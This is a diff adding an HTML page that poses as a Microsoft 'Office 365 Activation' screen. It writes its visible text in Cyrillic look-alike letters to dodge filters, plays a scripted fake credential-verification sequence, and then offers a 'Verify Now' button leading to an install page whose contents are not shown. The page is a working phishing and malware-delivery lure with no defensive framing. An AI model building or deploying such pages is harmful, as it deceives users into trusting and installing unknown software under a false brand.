@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оffісе 365 Асtіvаtіоn</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", -apple-system, system-ui, sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.5;
+            color: #323130;
+        }
+
+        .verify-container {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 2.5rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 600px;
+            transform: translateY(20px);
+            opacity: 0;
+            animation: containerFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        .logo {
+            height: 28px;
+            margin-bottom: 2.5rem;
+            display: block;
+            transform: translateY(10px);
+            opacity: 0;
+            animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) 0.4s forwards;
+        }
+
+        .status-container {
+            margin: 2.5rem 0;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1.25rem;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            padding: 0.75rem;
+            border-radius: 8px;
+        }
+
+        .status-item.active {
+            opacity: 1;
+            transform: translateY(0);
+            background: rgba(0, 120, 212, 0.05);
+        }
+
+        .status-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 16px;
+            position: relative;
+        }
+
+        .status-icon::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2.5px solid #0078d4;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+
+        .status-icon.complete::before {
+            animation: completeFill 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            border-color: #107c10;
+        }
+
+        .status-icon.complete::after {
+            content: '';
+            position: absolute;
+            width: 8px;
+            height: 12px;
+            border: solid white;
+            border-width: 0 2.5px 2.5px 0;
+            transform: rotate(45deg) scale(0);
+            top: 5px;
+            left: 8px;
+            animation: checkmark 0.3s cubic-bezier(0.16, 1, 0.3, 1) 0.2s forwards;
+        }
+
+        .status-text {
+            font-size: 15px;
+            color: #323130;
+            font-weight: 500;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f3f2f1;
+            border-radius: 4px;
+            margin: 2.5rem 0;
+            overflow: hidden;
+            opacity: 0;
+            animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) 0.2s forwards;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0078d4, #106ebe);
+            width: 0%;
+            transition: width 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            border-radius: 4px;
+        }
+
+        .message {
+            color: #323130;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+            text-align: center;
+            opacity: 0;
+            animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) 0.2s forwards;
+        }
+
+        .submessage {
+            color: #605e5c;
+            font-size: 15px;
+            text-align: center;
+            opacity: 0;
+            animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) 0.3s forwards;
+        }
+
+        .verify-button {
+            background: linear-gradient(90deg, #0078d4, #106ebe);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 1.5rem;
+            display: none;
+            transform: translateY(10px);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.2);
+        }
+
+        .verify-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 120, 212, 0.25);
+            background: linear-gradient(90deg, #106ebe, #005a9e);
+        }
+
+        .verify-button.show {
+            display: block;
+            animation: buttonFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes containerFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes buttonFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes completeFill {
+            from {
+                transform: scale(1);
+                border-color: #0078d4;
+            }
+            to {
+                transform: scale(1);
+                border-color: #107c10;
+                background: #107c10;
+            }
+        }
+
+        @keyframes checkmark {
+            from {
+                transform: rotate(45deg) scale(0);
+            }
+            to {
+                transform: rotate(45deg) scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-container">
+        <img src="images/ms-logo.png" alt="Місrоsоft Lоgо" class="logo">
+        
+        <h1 class="message">Оffісе 365 Асtіvаtіоn</h1>
+        <p class="submessage">Рlеаsе wаіt whіlе wе vеrіfy yоur ассоunt іnfоrmаtіоn...</p>
+
+        <div class="status-container">
+            <div class="status-item" id="status1">
+                <div class="status-icon"></div>
+                <span class="status-text">Vеrіfyіng ассоunt сrеdеntіаls...</span>
+            </div>
+            <div class="status-item" id="status2">
+                <div class="status-icon"></div>
+                <span class="status-text">Сhесkіng ассоunt stаtus...</span>
+            </div>
+            <div class="status-item" id="status3">
+                <div class="status-icon"></div>
+                <span class="status-text">Рrераrіng yоur Оffісе 365 Асtіvаtіоn...</span>
+            </div>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="progress"></div>
+        </div>
+
+        <button id="verifyButton" class="verify-button" onclick="location.href='install.html'">
+            Vеrіfy Nоw
+        </button>
+    </div>
+
+    <script>
+        function updateProgress(percent) {
+            document.getElementById('progress').style.width = percent + '%';
+        }
+
+        function processStatus(statusId, delay, completionDelay = 1000, isWarning = false) {
+            setTimeout(() => {
+                const statusItem = document.getElementById(statusId);
+                statusItem.classList.add('active');
+                statusItem.style.transition = 'all 0.5s cubic-bezier(0.16, 1, 0.3, 1)';
+                
+                if (completionDelay) {
+                    setTimeout(() => {
+                        const icon = statusItem.querySelector('.status-icon');
+                        if (isWarning) {
+                            icon.classList.add('warning');
+                            document.getElementById('warningBox')?.classList.add('show');
+                        } else {
+                            icon.classList.add('complete');
+                        }
+                    }, completionDelay);
+                }
+            }, delay);
+        }
+
+        window.onload = function() {
+            // Initial progress
+            updateProgress(15);
+            processStatus('status1', 0);
+            
+            // Status 1 complete - 35%
+            setTimeout(() => updateProgress(35), 1000);
+            processStatus('status2', 1500);
+            
+            // Status 2 complete - 70%
+            setTimeout(() => updateProgress(70), 2500);
+            processStatus('status3', 3500, 10000);
+            
+            // Status 3 complete - 100% (synced with status 3 completion)
+            setTimeout(() => updateProgress(100), 13500); // 3500 + 5000 = 8500
+
+            // Show verify button after all complete
+            setTimeout(() => {
+                const button = document.getElementById('verifyButton');
+                button.classList.add('show');
+            }, 15000);
+        };
+    </script>
+</body>
+</html>
